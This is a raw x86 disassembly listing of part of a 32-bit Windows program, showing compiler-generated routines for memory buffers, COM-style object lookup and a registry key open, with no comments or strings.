  4034dc:	mov    DWORD PTR [ebp-0xbc],eax
  4034e2:	mov    DWORD PTR [ebp-0xb4],ebx
  4034e8:	call   0x402a74
  4034ed:	mov    eax,DWORD PTR [esi+0x2c]
  4034f0:	lea    ecx,[ebp-0x8c]
  4034f6:	mov    edx,DWORD PTR [esi+0x30]
  4034f9:	and    DWORD PTR [ebp-0x98],0x0
  403500:	and    DWORD PTR [ebp-0x90],0x0
  403507:	mov    DWORD PTR [ebp-0x140],eax
  40350d:	lea    eax,[ebp-0x140]
  403513:	mov    DWORD PTR [ebp-0x9c],eax
  403519:	mov    DWORD PTR [ebp-0x94],ebx
  40351f:	call   0x402a74
  403524:	mov    edx,DWORD PTR [esi+0x34]
  403527:	lea    ecx,[ebp-0x7c]
  40352a:	call   0x4029f7
  40352f:	mov    eax,DWORD PTR [esi+0x38]
  403532:	lea    ecx,[ebp-0x5c]
  403535:	mov    edx,DWORD PTR [esi+0x3c]
  403538:	and    DWORD PTR [ebp-0x68],0x0
  40353c:	and    DWORD PTR [ebp-0x60],0x0
  403540:	mov    DWORD PTR [ebp-0x144],eax
  403546:	lea    eax,[ebp-0x144]
  40354c:	mov    DWORD PTR [ebp-0x6c],eax
  40354f:	mov    DWORD PTR [ebp-0x64],ebx
  403552:	call   0x402a74
  403557:	mov    edx,DWORD PTR [esi+0x40]
  40355a:	lea    ecx,[ebp-0x4c]
  40355d:	call   0x4029f7
  403562:	mov    eax,DWORD PTR [esi+0x8]
  403565:	xor    ecx,ecx
  403567:	mov    DWORD PTR [ebp-0x148],eax
  40356d:	lea    eax,[ebp-0x148]
  403573:	mov    DWORD PTR [ebp-0x3c],eax
  403576:	mov    eax,DWORD PTR [esi+0x24]
  403579:	mov    DWORD PTR [ebp-0x150],eax
  40357f:	lea    eax,[ebp-0x150]
  403585:	mov    DWORD PTR [ebp-0x38],ecx
  403588:	mov    DWORD PTR [ebp-0x34],ebx
  40358b:	mov    DWORD PTR [ebp-0x30],ecx
  40358e:	mov    DWORD PTR [ebp-0x2c],eax
  403591:	mov    DWORD PTR [ebp-0x28],ecx
  403594:	mov    DWORD PTR [ebp-0x24],ebx
  403597:	mov    DWORD PTR [ebp-0x20],ecx
  40359a:	mov    edx,DWORD PTR [esi+0x18]
  40359d:	lea    ecx,[ebp-0x1c]
  4035a0:	call   0x402a74
  4035a5:	lea    eax,[ebp-0x13c]
  4035ab:	mov    edx,0x4024b4
  4035b0:	push   eax
  4035b1:	push   0x13
  4035b3:	push   ecx
  4035b4:	push   ecx
  4035b5:	mov    ecx,edi
  4035b7:	call   0x402aab
  4035bc:	mov    ecx,DWORD PTR [ebp-0x8]
  4035bf:	pop    edi
  4035c0:	pop    esi
  4035c1:	xor    ecx,ebp
  4035c3:	pop    ebx
  4035c4:	call   0x404560
  4035c9:	mov    esp,ebp
  4035cb:	pop    ebp
  4035cc:	ret    0x4
  4035cf:	int3   
  4035d0:	int3   
  4035d1:	int3   
  4035d2:	int3   
  4035d3:	int3   
  4035d4:	int3   
  4035d5:	int3   
  4035d6:	int3   
  4035d7:	int3   
  4035d8:	int3   
  4035d9:	int3   
  4035da:	int3   
  4035db:	int3   
  4035dc:	int3   
  4035dd:	int3   
  4035de:	int3   
  4035df:	int3   
  4035e0:	mov    edi,edi
  4035e2:	push   ebp
  4035e3:	mov    ebp,esp
  4035e5:	and    esp,0xfffffff8
  4035e8:	cmp    BYTE PTR [ebp+0x8],0x0
  4035ec:	jne    0x40360c
  4035ee:	cmp    DWORD PTR [ecx+0xc],0x1
  4035f2:	jne    0x4035fe
  4035f4:	push   DWORD PTR [ebp+0xc]
  4035f7:	call   0x403256
  4035fc:	jmp    0x40360c
  4035fe:	cmp    DWORD PTR [ecx+0xc],0x2
  403602:	jne    0x40360c
  403604:	push   DWORD PTR [ebp+0xc]
  403607:	call   0x4033f4
  40360c:	mov    esp,ebp
  40360e:	pop    ebp
  40360f:	ret    0x8
  403612:	int3   
  403613:	int3   
  403614:	int3   
  403615:	int3   
  403616:	int3   
  403617:	cmp    BYTE PTR [ecx+0x8],0x0
  40361b:	mov    DWORD PTR [ecx],0x401fd8
  403621:	je     0x40363e
  403623:	push   esi
  403624:	mov    esi,DWORD PTR [ecx+0x4]
  403627:	push   DWORD PTR [esi+0x1c]
  40362a:	push   DWORD PTR [esi+0x18]
  40362d:	call   DWORD PTR ds:0x407004
  403633:	xor    eax,eax
  403635:	mov    DWORD PTR [esi+0x18],eax
  403638:	mov    DWORD PTR [esi+0x1c],eax
  40363b:	mov    DWORD PTR [esi],eax
  40363d:	pop    esi
  40363e:	ret    
  40363f:	int3   
  403640:	int3   
  403641:	int3   
  403642:	int3   
  403643:	int3   
  403644:	mov    edi,edi
  403646:	push   ebp
  403647:	mov    ebp,esp
  403649:	sub    esp,0x78
  40364c:	mov    eax,ds:0x406004
  403651:	xor    eax,ebp
  403653:	mov    DWORD PTR [ebp-0x8],eax
  403656:	mov    eax,ds:0x406560
  40365b:	push   ebx
  40365c:	xor    ebx,ebx
  40365e:	mov    DWORD PTR [ebp-0x74],ebx
  403661:	push   esi
  403662:	push   edi
  403663:	test   al,0x1
  403665:	jne    0x40367a
  403667:	or     eax,0x1
  40366a:	push   0x4056c0
  40366f:	mov    ds:0x406560,eax
  403674:	call   0x404613
  403679:	pop    ecx
  40367a:	lea    eax,[ebp-0x70]
  40367d:	push   eax
  40367e:	lea    eax,[ebp-0x78]
  403681:	push   eax
  403682:	push   ebx
  403683:	push   0x406548
  403688:	call   DWORD PTR ds:0x4070a8
  40368e:	cmp    DWORD PTR [ebp-0x78],ebx
  403691:	je     0x403744
  403697:	mov    DWORD PTR [ebp-0x70],0x40654c
  40369e:	mov    DWORD PTR ds:0x40654c,0x401fc4
  4036a8:	mov    esi,DWORD PTR ds:0x40601c
  4036ae:	lea    edi,[ebp-0x6c]
  4036b1:	mov    ecx,0x406018
  4036b6:	mov    BYTE PTR ds:0x406554,0x1
  4036bd:	mov    DWORD PTR ds:0x40655c,ecx
  4036c3:	lea    eax,[ebp-0x6c]
  4036c6:	mov    DWORD PTR ds:0x406550,ecx
  4036cc:	lea    esi,[esi-0x10]
  4036cf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4036d0:	push   0x406030
  4036d5:	push   ecx
  4036d6:	push   0x402960
  4036db:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4036dc:	push   eax
  4036dd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4036de:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4036df:	mov    DWORD PTR ds:0x406038,ebx
  4036e5:	mov    DWORD PTR ds:0x40603c,ebx
  4036eb:	call   DWORD PTR ds:0x40700c
  4036f1:	test   eax,eax
  4036f3:	jne    0x403714
  4036f5:	mov    ecx,DWORD PTR ds:0x40601c
  4036fb:	movzx  eax,WORD PTR [ecx]
  4036fe:	push   eax
  4036ff:	push   ecx
  403700:	push   0x2
  403702:	push   DWORD PTR ds:0x406034
  403708:	push   DWORD PTR ds:0x406030
  40370e:	call   DWORD PTR ds:0x407008
  403714:	mov    eax,ds:0x40654c
  403719:	mov    DWORD PTR ds:0x406558,0x1
  403723:	mov    esi,DWORD PTR [eax+0x4]
  403726:	mov    ecx,esi
  403728:	call   DWORD PTR ds:0x40717c
  40372e:	mov    edi,0x40654c
  403733:	mov    ecx,edi
  403735:	call   esi
  403737:	push   edi
  403738:	push   ebx
  403739:	push   0x406548
  40373e:	call   DWORD PTR ds:0x4070ac
  403744:	mov    eax,DWORD PTR [ebp-0x70]
  403747:	mov    esi,DWORD PTR [eax+0x4]
  40374a:	cmp    DWORD PTR [esi],0x5
  40374d:	jbe    0x4037a1
  40374f:	push   0x4000
  403754:	push   ebx
  403755:	mov    ecx,esi
  403757:	call   0x402a3a
  40375c:	test   al,al
  40375e:	je     0x4037a1
  403760:	mov    edx,0x40207c
  403765:	lea    ecx,[ebp-0x3c]
  403768:	call   0x402a74
  40376d:	mov    edx,0x40206c
  403772:	lea    ecx,[ebp-0x2c]
  403775:	call   0x402a74
  40377a:	lea    eax,[ebp-0x74]
  40377d:	mov    DWORD PTR [ebp-0x18],ebx
  403780:	mov    DWORD PTR [ebp-0x1c],eax
  403783:	mov    DWORD PTR [ebp-0x14],0x4
  40378a:	mov    DWORD PTR [ebp-0x10],ebx
  40378d:	lea    eax,[ebp-0x5c]
  403790:	mov    edx,0x4025da
  403795:	push   eax
  403796:	push   0x5
  403798:	push   ecx
  403799:	push   ecx
  40379a:	mov    ecx,esi
  40379c:	call   0x402aab
  4037a1:	mov    ecx,DWORD PTR [ebp-0x8]
  4037a4:	pop    edi
  4037a5:	pop    esi
  4037a6:	xor    ecx,ebp
  4037a8:	pop    ebx
  4037a9:	call   0x404560
  4037ae:	mov    esp,ebp
  4037b0:	pop    ebp
  4037b1:	ret    0x4
  4037b4:	int3   
  4037b5:	int3   
  4037b6:	int3   
  4037b7:	int3   
  4037b8:	int3   
  4037b9:	mov    edi,edi
  4037bb:	push   ebp
  4037bc:	mov    ebp,esp
  4037be:	mov    eax,ds:0x4064fc
  4037c3:	push   esi
  4037c4:	mov    esi,edx
  4037c6:	test   al,0x1
  4037c8:	jne    0x4037f7
  4037ca:	or     eax,0x1
  4037cd:	mov    ds:0x4064fc,eax
  4037d2:	call   0x403f31
  4037d7:	test   eax,eax
  4037d9:	je     0x4037f0
  4037db:	call   0x403f07
  4037e0:	test   eax,eax
  4037e2:	je     0x4037f0
  4037e4:	mov    DWORD PTR ds:0x4064f8,0x1
  4037ee:	jmp    0x4037f7
  4037f0:	and    DWORD PTR ds:0x4064f8,0x0
  4037f7:	push   DWORD PTR [ebp+0x10]
  4037fa:	push   0x20019
  4037ff:	push   0x0
  403801:	push   esi
  403802:	push   0x80000002
  403807:	call   DWORD PTR ds:0x40702c
  40380d:	pop    esi
  40380e:	pop    ebp
  40380f:	ret    0xc
  403812:	int3   
  403813:	int3   
  403814:	int3   
  403815:	int3   
  403816:	int3   
  403817:	mov    eax,ds:0x406588
  40381c:	mov    ecx,0x406588
  403821:	push   DWORD PTR [eax+0x4]
  403824:	call   0x4039cc
  403829:	mov    eax,ds:0x406588
  40382e:	mov    DWORD PTR [eax+0x4],eax
  403831:	mov    eax,ds:0x406588
  403836:	mov    DWORD PTR [eax],eax
  403838:	mov    eax,ds:0x406588
  40383d:	mov    DWORD PTR [eax+0x8],eax
  403840:	push   DWORD PTR ds:0x406588
  403846:	and    DWORD PTR ds:0x40658c,0x0
  40384d:	call   DWORD PTR ds:0x4070bc
  403853:	pop    ecx
  403854:	ret    
  403855:	int3   
  403856:	int3   
  403857:	int3   
  403858:	int3   
  403859:	int3   
  40385a:	mov    edi,edi
  40385c:	push   esi
  40385d:	mov    esi,ecx
  40385f:	cmp    DWORD PTR [esi],0x0
  403862:	je     0x403877
  403864:	push   DWORD PTR [esi]
  403866:	call   DWORD PTR ds:0x4070bc
  40386c:	xor    eax,eax
  40386e:	pop    ecx
  40386f:	mov    DWORD PTR [esi],eax
  403871:	mov    DWORD PTR [esi+0x4],eax
  403874:	mov    DWORD PTR [esi+0x8],eax
  403877:	pop    esi
  403878:	ret    
  403879:	int3   
  40387a:	int3   
  40387b:	int3   
  40387c:	int3   
  40387d:	int3   
  40387e:	mov    edi,edi
  403880:	push   ebp
  403881:	mov    ebp,esp
  403883:	push   ebx
  403884:	mov    ebx,ecx
  403886:	push   esi
  403887:	mov    esi,DWORD PTR [ebp+0x8]
  40388a:	mov    eax,DWORD PTR [ebx+0x4]
  40388d:	mov    ecx,eax
  40388f:	mov    edx,DWORD PTR [ebx]
  403891:	sub    ecx,edx
  403893:	cmp    ecx,esi
  403895:	jbe    0x4038bd
  403897:	add    esi,edx
  403899:	cmp    esi,edx
  40389b:	jne    0x4038a2
  40389d:	mov    DWORD PTR [ebx+0x4],edx
  4038a0:	jmp    0x4038e7
  4038a2:	cmp    esi,eax
  4038a4:	je     0x4038e7
  4038a6:	push   edi
  4038a7:	mov    edi,eax
  4038a9:	sub    edi,eax
  4038ab:	push   edi
  4038ac:	push   eax
  4038ad:	push   esi
  4038ae:	call   DWORD PTR ds:0x40712c
  4038b4:	add    esp,0xc
  4038b7:	lea    eax,[edi+esi*1]
  4038ba:	pop    edi
  4038bb:	jmp    0x4038e4
  4038bd:	jae    0x4038e7
  4038bf:	sub    edx,eax
  4038c1:	mov    ecx,ebx
  4038c3:	add    edx,esi
  4038c5:	push   edx
  4038c6:	call   0x4038f2
  4038cb:	mov    eax,DWORD PTR [ebx]
  4038cd:	sub    eax,DWORD PTR [ebx+0x4]
  4038d0:	add    eax,esi
  4038d2:	push   eax
  4038d3:	push   0x0
  4038d5:	push   DWORD PTR [ebx+0x4]
  4038d8:	call   0x40562a
  4038dd:	mov    eax,DWORD PTR [ebx]
  4038df:	add    esp,0xc
  4038e2:	add    eax,esi
  4038e4:	mov    DWORD PTR [ebx+0x4],eax
  4038e7:	pop    esi
  4038e8:	pop    ebx
  4038e9:	pop    ebp
  4038ea:	ret    0x4
  4038ed:	int3   
  4038ee:	int3   
  4038ef:	int3   
  4038f0:	int3   
  4038f1:	int3   
  4038f2:	mov    edi,edi
  4038f4:	push   ebp
  4038f5:	mov    ebp,esp
  4038f7:	mov    edx,DWORD PTR [ecx+0x8]
  4038fa:	mov    eax,edx
  4038fc:	push   esi
  4038fd:	mov    esi,DWORD PTR [ecx+0x4]
  403900:	sub    eax,esi
  403902:	cmp    eax,DWORD PTR [ebp+0x8]
  403905:	jae    0x403939
  403907:	mov    eax,DWORD PTR [ecx]
  403909:	sub    eax,esi
  40390b:	dec    eax
  40390c:	cmp    eax,DWORD PTR [ebp+0x8]
  40390f:	jb     0x40393e
  403911:	sub    edx,DWORD PTR [ecx]
  403913:	or     eax,0xffffffff
  403916:	sub    esi,DWORD PTR [ecx]
  403918:	add    esi,DWORD PTR [ebp+0x8]
  40391b:	push   edi
  40391c:	mov    edi,edx
  40391e:	shr    edi,1
  403920:	sub    eax,edi
  403922:	cmp    eax,edx
  403924:	jae    0x40392a
  403926:	xor    edx,edx
  403928:	jmp    0x40392c
  40392a:	add    edx,edi
  40392c:	pop    edi
  40392d:	cmp    edx,esi
  40392f:	jae    0x403933
  403931:	mov    edx,esi
  403933:	push   edx
  403934:	call   0x403949
  403939:	pop    esi
  40393a:	pop    ebp
  40393b:	ret    0x4
  40393e:	call   0x4039bc
  403943:	int3   
  403944:	int3   
  403945:	int3   
  403946:	int3   
  403947:	int3   
  403948:	int3   
  403949:	mov    edi,edi
  40394b:	push   ebp
  40394c:	mov    ebp,esp
  40394e:	push   ecx
  40394f:	push   ebx
  403950:	push   esi
  403951:	push   edi
  403952:	mov    edi,DWORD PTR [ebp+0x8]
  403955:	xor    esi,esi
  403957:	mov    ebx,ecx
  403959:	test   edi,edi
  40395b:	je     0x403970
  40395d:	cmp    edi,0xffffffff
  403960:	ja     0x4039b1
  403962:	push   edi
  403963:	call   DWORD PTR ds:0x4070b8
  403969:	mov    esi,eax
  40396b:	pop    ecx
  40396c:	test   esi,esi
  40396e:	je     0x4039b1
  403970:	mov    eax,DWORD PTR [ebx+0x4]
  403973:	sub    eax,DWORD PTR [ebx]
  403975:	push   eax
  403976:	push   DWORD PTR [ebx]
  403978:	push   esi
  403979:	call   DWORD PTR ds:0x40712c
  40397f:	mov    eax,DWORD PTR [ebx+0x4]
  403982:	add    esp,0xc
  403985:	sub    eax,DWORD PTR [ebx]
  403987:	cmp    DWORD PTR [ebx],0x0
  40398a:	mov    DWORD PTR [ebp-0x4],eax
  40398d:	je     0x403998
  40398f:	push   DWORD PTR [ebx]
  403991:	call   DWORD PTR ds:0x4070bc
  403997:	pop    ecx
  403998:	lea    eax,[esi+edi*1]
  40399b:	mov    DWORD PTR [ebx],esi
  40399d:	mov    DWORD PTR [ebx+0x8],eax
  4039a0:	mov    eax,DWORD PTR [ebp-0x4]
  4039a3:	pop    edi
  4039a4:	add    eax,esi
  4039a6:	pop    esi
  4039a7:	mov    DWORD PTR [ebx+0x4],eax
  4039aa:	pop    ebx
  4039ab:	mov    esp,ebp
  4039ad:	pop    ebp
  4039ae:	ret    0x4
  4039b1:	call   0x405015
  4039b6:	int3   
  4039b7:	int3   
  4039b8:	int3   
  4039b9:	int3   
  4039ba:	int3   
  4039bb:	int3   
  4039bc:	push   0x402090
  4039c1:	call   0x405049
  4039c6:	int3   
  4039c7:	int3   
  4039c8:	int3   
  4039c9:	int3   
  4039ca:	int3   
  4039cb:	int3   
  4039cc:	mov    edi,edi
  4039ce:	push   ebp
  4039cf:	mov    ebp,esp
  4039d1:	push   ebx
  4039d2:	push   esi
  4039d3:	push   edi
  4039d4:	mov    edi,DWORD PTR [ebp+0x8]
  4039d7:	mov    ebx,ecx
  4039d9:	mov    esi,edi
  4039db:	cmp    BYTE PTR [edi+0xd],0x0
  4039df:	jne    0x4039fd
  4039e1:	push   DWORD PTR [esi+0x8]
  4039e4:	mov    ecx,ebx
  4039e6:	call   0x4039cc
  4039eb:	mov    esi,DWORD PTR [esi]
  4039ed:	push   edi
  4039ee:	call   DWORD PTR ds:0x4070bc
  4039f4:	cmp    BYTE PTR [esi+0xd],0x0
  4039f8:	mov    edi,esi
  4039fa:	pop    ecx
  4039fb:	je     0x4039e1
  4039fd:	pop    edi
  4039fe:	pop    esi
  4039ff:	pop    ebx
  403a00:	pop    ebp
  403a01:	ret    0x4
  403a04:	int3   
  403a05:	int3   
  403a06:	int3   
  403a07:	int3   
  403a08:	int3   
  403a09:	push   0x18
  403a0b:	call   DWORD PTR ds:0x4070b8
  403a11:	pop    ecx
  403a12:	test   eax,eax
  403a14:	je     0x405015
  403a1a:	lea    ecx,[eax+0x4]
  403a1d:	mov    DWORD PTR [eax],eax
  403a1f:	test   ecx,ecx
  403a21:	je     0x403a25
  403a23:	mov    DWORD PTR [ecx],eax
  403a25:	lea    ecx,[eax+0x8]
  403a28:	test   ecx,ecx
  403a2a:	je     0x403a2e
  403a2c:	mov    DWORD PTR [ecx],eax
  403a2e:	mov    WORD PTR [eax+0xc],0x101
  403a34:	ret    
  403a35:	int3   
  403a36:	int3   
  403a37:	int3   
  403a38:	int3   
  403a39:	int3   
  403a3a:	mov    edi,edi
  403a3c:	push   ebp
  403a3d:	mov    ebp,esp
  403a3f:	lea    eax,[ebp+0x14]
  403a42:	push   eax
  403a43:	push   DWORD PTR [ebp+0x10]
  403a46:	push   0xffffffff
  403a48:	push   DWORD PTR [ebp+0xc]
  403a4b:	push   DWORD PTR [ebp+0x8]
  403a4e:	call   DWORD PTR ds:0x407130
  403a54:	add    esp,0x14
  403a57:	cmp    eax,0xffffffff
  403a5a:	jne    0x403a63
  403a5c:	mov    eax,0x8007007a
  403a61:	pop    ebp
  403a62:	ret    
  403a63:	xor    eax,eax
  403a65:	pop    ebp
  403a66:	ret    
  403a67:	int3   
  403a68:	int3   
  403a69:	int3   
  403a6a:	int3   
  403a6b:	int3   
  403a6c:	test   ecx,ecx
  403a6e:	je     0x403a88
  403a70:	push   esi
  403a71:	lea    edx,[ecx+0x2]
  403a74:	xor    esi,esi
  403a76:	mov    ax,WORD PTR [ecx]
  403a79:	add    ecx,0x2
  403a7c:	cmp    ax,si
  403a7f:	jne    0x403a76
  403a81:	sub    ecx,edx
  403a83:	sar    ecx,1
  403a85:	pop    esi
  403a86:	jmp    0x403a8a
  403a88:	xor    ecx,ecx
  403a8a:	mov    eax,ecx
  403a8c:	ret    
  403a8d:	int3   
  403a8e:	int3   
  403a8f:	int3   
  403a90:	int3   
  403a91:	int3   
  403a92:	mov    DWORD PTR [ecx],0x401ff0
  403a98:	ret    
  403a99:	int3   
  403a9a:	int3   
  403a9b:	int3   
  403a9c:	int3   
  403a9d:	int3   
  403a9e:	int3   
  403a9f:	int3   
  403aa0:	mov    edi,edi
  403aa2:	push   ebp
  403aa3:	mov    ebp,esp
  403aa5:	test   BYTE PTR [ebp+0x8],0x1
  403aa9:	push   esi
  403aaa:	mov    esi,ecx
  403aac:	mov    DWORD PTR [esi],0x401ff0
  403ab2:	je     0x403abc
  403ab4:	push   esi
  403ab5:	call   DWORD PTR ds:0x4070bc
  403abb:	pop    ecx
  403abc:	mov    eax,esi
  403abe:	pop    esi
  403abf:	pop    ebp
  403ac0:	ret    0x4
  403ac3:	int3   
  403ac4:	int3   
  403ac5:	int3   
  403ac6:	int3   
  403ac7:	int3   
  403ac8:	mov    edi,edi
  403aca:	push   ebp
  403acb:	mov    ebp,esp
  403acd:	sub    esp,0x14
  403ad0:	mov    eax,ds:0x406004
  403ad5:	xor    eax,ebp
  403ad7:	mov    DWORD PTR [ebp-0x4],eax
  403ada:	mov    eax,ds:0x406500
  403adf:	push   ebx
  403ae0:	push   esi
  403ae1:	push   edi
  403ae2:	mov    ebx,DWORD PTR [eax+0x8]
  403ae5:	mov    edi,ecx
  403ae7:	mov    DWORD PTR [ebp-0x8],edi
  403aea:	mov    esi,0x402008
  403aef:	jmp    0x403b07
  403af1:	xor    ecx,ecx
  403af3:	mov    eax,DWORD PTR [esi+ecx*4]
  403af6:	cmp    eax,DWORD PTR [ebx+ecx*4+0x8]
  403afa:	jne    0x403b04
  403afc:	inc    ecx
  403afd:	cmp    ecx,0x4
  403b00:	jne    0x403af3
  403b02:	jmp    0x403b0b
  403b04:	mov    ebx,DWORD PTR [ebx+0x4]
  403b07:	test   ebx,ebx
  403b09:	jne    0x403af1
  403b0b:	test   ebx,ebx
  403b0d:	jne    0x403b99
  403b13:	push   ecx
  403b14:	xor    eax,eax
  403b16:	push   ecx
  403b17:	mov    ds:0x406598,ax
  403b1d:	call   0x404035
  403b22:	test   eax,eax
  403b24:	je     0x403b30
  403b26:	mov    eax,0x80004002
  403b2b:	jmp    0x403c10
  403b30:	push   0x406598
  403b35:	call   DWORD PTR ds:0x40709c
  403b3b:	mov    DWORD PTR [ebp-0xc],eax
  403b3e:	test   eax,eax
  403b40:	je     0x403b26
  403b42:	push   0x1c
  403b44:	call   DWORD PTR ds:0x4070b8
  403b4a:	mov    ebx,eax
  403b4c:	mov    DWORD PTR [ebp-0x10],ebx
  403b4f:	pop    ecx
  403b50:	test   ebx,ebx
  403b52:	je     0x403b70
  403b54:	and    DWORD PTR [ebx+0x4],0x0
  403b58:	lea    edi,[ebx+0x8]
  403b5b:	mov    eax,DWORD PTR [ebp-0xc]
  403b5e:	mov    DWORD PTR [ebx],0x401fec
  403b64:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403b65:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403b66:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403b67:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403b68:	mov    edi,DWORD PTR [ebp-0x8]
  403b6b:	mov    DWORD PTR [ebx+0x18],eax
  403b6e:	jmp    0x403b72
  403b70:	xor    ebx,ebx
  403b72:	test   ebx,ebx
  403b74:	jne    0x403b80
  403b76:	mov    eax,0x8007000e
  403b7b:	jmp    0x403c10
  403b80:	mov    edx,DWORD PTR ds:0x406500
  403b86:	lea    eax,[edx+0x8]
  403b89:	jmp    0x403b8e
  403b8b:	lea    eax,[ecx+0x4]
  403b8e:	mov    ecx,DWORD PTR [eax]
  403b90:	test   ecx,ecx
  403b92:	jne    0x403b8b
  403b94:	mov    DWORD PTR [eax],ebx
  403b96:	inc    DWORD PTR [edx+0x4]
  403b99:	push   0x4020b8
  403b9e:	push   DWORD PTR [ebx+0x18]
  403ba1:	call   DWORD PTR ds:0x407088
  403ba7:	mov    esi,eax
  403ba9:	test   esi,esi
  403bab:	jne    0x403bf1
  403bad:	mov    edx,DWORD PTR ds:0x406500
  403bb3:	lea    ecx,[edx+0x8]
  403bb6:	jmp    0x403bc1
  403bb8:	mov    eax,DWORD PTR [ecx]
  403bba:	cmp    ebx,eax
  403bbc:	je     0x403be7
  403bbe:	lea    ecx,[eax+0x4]
  403bc1:	cmp    DWORD PTR [ecx],0x0
  403bc4:	jne    0x403bb8
  403bc6:	xor    ebx,ebx
  403bc8:	test   ebx,ebx
  403bca:	je     0x403b26
  403bd0:	mov    eax,DWORD PTR [ebx]
  403bd2:	push   0x1
  403bd4:	mov    esi,DWORD PTR [eax]
  403bd6:	mov    ecx,esi
  403bd8:	call   DWORD PTR ds:0x40717c
  403bde:	mov    ecx,ebx
  403be0:	call   esi
  403be2:	jmp    0x403b26
  403be7:	mov    eax,DWORD PTR [eax+0x4]
  403bea:	mov    DWORD PTR [ecx],eax
  403bec:	dec    DWORD PTR [edx+0x4]
  403bef:	jmp    0x403bc8
  403bf1:	push   edi
  403bf2:	push   0x4021e4
  403bf7:	push   0x402008
  403bfc:	mov    ecx,esi
  403bfe:	call   DWORD PTR ds:0x40717c
  403c04:	call   esi
  403c06:	test   eax,eax
  403c08:	js     0x403b26
  403c0e:	xor    eax,eax
  403c10:	mov    ecx,DWORD PTR [ebp-0x4]
  403c13:	pop    edi
  403c14:	pop    esi
  403c15:	xor    ecx,ebp
  403c17:	pop    ebx
  403c18:	call   0x404560
  403c1d:	mov    esp,ebp
  403c1f:	pop    ebp
  403c20:	ret    
  403c21:	int3   
  403c22:	int3   
  403c23:	int3   
  403c24:	int3   
  403c25:	int3   
  403c26:	mov    edi,edi
  403c28:	push   ebp
  403c29:	mov    ebp,esp
  403c2b:	push   ecx
  403c2c:	push   ecx
  403c2d:	mov    eax,ds:0x406004
  403c32:	xor    eax,ebp
  403c34:	mov    DWORD PTR [ebp-0x4],eax
  403c37:	push   ebx
  403c38:	mov    ebx,DWORD PTR [ebp+0x10]
  403c3b:	push   esi
  403c3c:	push   edi
  403c3d:	test   ebx,ebx
  403c3f:	jne    0x403c48
  403c41:	mov    eax,0x80070057
  403c46:	jmp    0x403ca2
  403c48:	and    DWORD PTR [ebx],0x0
  403c4b:	and    DWORD PTR [ebp-0x8],0x0
  403c4f:	cmp    DWORD PTR ds:0x406500,0x0
  403c56:	jne    0x403c5f
  403c58:	mov    edi,0x800401f0
  403c5d:	jmp    0x403ca0
  403c5f:	lea    ecx,[ebp-0x8]
  403c62:	call   0x403ac8
  403c67:	mov    edi,eax
  403c69:	test   edi,edi
  403c6b:	js     0x403ca0
  403c6d:	mov    eax,DWORD PTR [ebp-0x8]
  403c70:	test   eax,eax
  403c72:	je     0x403ca0
  403c74:	mov    esi,DWORD PTR [eax]
  403c76:	push   ebx
  403c77:	push   0x401ff8
  403c7c:	push   0x0
  403c7e:	mov    ecx,DWORD PTR [esi+0xc]
  403c81:	push   eax
  403c82:	call   DWORD PTR ds:0x40717c
  403c88:	call   DWORD PTR [esi+0xc]
  403c8b:	mov    edi,eax
  403c8d:	mov    eax,DWORD PTR [ebp-0x8]
  403c90:	push   eax
  403c91:	mov    ecx,DWORD PTR [eax]
  403c93:	mov    esi,DWORD PTR [ecx+0x8]
  403c96:	mov    ecx,esi
  403c98:	call   DWORD PTR ds:0x40717c
  403c9e:	call   esi
  403ca0:	mov    eax,edi
  403ca2:	mov    ecx,DWORD PTR [ebp-0x4]
  403ca5:	pop    edi
  403ca6:	pop    esi
  403ca7:	xor    ecx,ebp
  403ca9:	pop    ebx
  403caa:	call   0x404560
  403caf:	mov    esp,ebp
  403cb1:	pop    ebp
  403cb2:	ret    0xc
  403cb5:	int3   
  403cb6:	int3   
  403cb7:	int3   
  403cb8:	int3   
  403cb9:	int3   
  403cba:	int3   
  403cbb:	int3   
  403cbc:	int3   
  403cbd:	int3   
  403cbe:	int3   
  403cbf:	int3   
  403cc0:	push   0x8
  403cc2:	mov    eax,0x40563d
  403cc7:	call   0x40559c
  403ccc:	mov    esi,ecx
  403cce:	mov    DWORD PTR [ebp-0x14],esi
  403cd1:	mov    DWORD PTR [esi],0x401fec
  403cd7:	and    DWORD PTR [ebp-0x4],0x0
  403cdb:	cmp    DWORD PTR [esi+0x18],0x0
  403cdf:	je     0x403d11
  403ce1:	push   0x4020cc
  403ce6:	push   DWORD PTR [esi+0x18]
  403ce9:	call   DWORD PTR ds:0x407088
  403cef:	mov    edi,eax
  403cf1:	test   edi,edi
  403cf3:	je     0x403d08
  403cf5:	mov    ecx,edi
  403cf7:	call   DWORD PTR ds:0x40717c
  403cfd:	call   edi
  403cff:	neg    eax
  403d01:	sbb    eax,eax
  403d03:	add    eax,0x1
  403d06:	je     0x403d11
  403d08:	push   DWORD PTR [esi+0x18]
  403d0b:	call   DWORD PTR ds:0x407034
  403d11:	test   BYTE PTR [ebp+0x8],0x1
  403d15:	mov    DWORD PTR [esi],0x401ff0
  403d1b:	je     0x403d25
  403d1d:	push   esi
  403d1e:	call   DWORD PTR ds:0x4070bc
  403d24:	pop    ecx
  403d25:	mov    eax,esi
  403d27:	call   0x405550
  403d2c:	ret    0x4
  403d2f:	int3   
  403d30:	int3   
  403d31:	int3   
  403d32:	int3   
  403d33:	int3   
  403d34:	int3   
  403d35:	int3   
  403d36:	int3   
  403d37:	int3   
  403d38:	int3   
  403d39:	int3   
  403d3a:	int3   
  403d3b:	int3   
  403d3c:	int3   
  403d3d:	int3   
  403d3e:	int3   
  403d3f:	int3   
  403d40:	mov    edi,edi
  403d42:	push   ebp
  403d43:	mov    ebp,esp
  403d45:	push   esi
  403d46:	mov    esi,ecx
  403d48:	mov    DWORD PTR [esi],0x401fe8
  403d4e:	call   0x403d97
  403d53:	test   BYTE PTR [ebp+0x8],0x1
  403d57:	je     0x403d61
  403d59:	push   esi
  403d5a:	call   DWORD PTR ds:0x4070bc
  403d60:	pop    ecx
  403d61:	mov    eax,esi
  403d63:	pop    esi
  403d64:	pop    ebp
  403d65:	ret    0x4
  403d68:	int3   
  403d69:	int3   
  403d6a:	int3   
  403d6b:	int3   
  403d6c:	int3   
  403d6d:	int3   
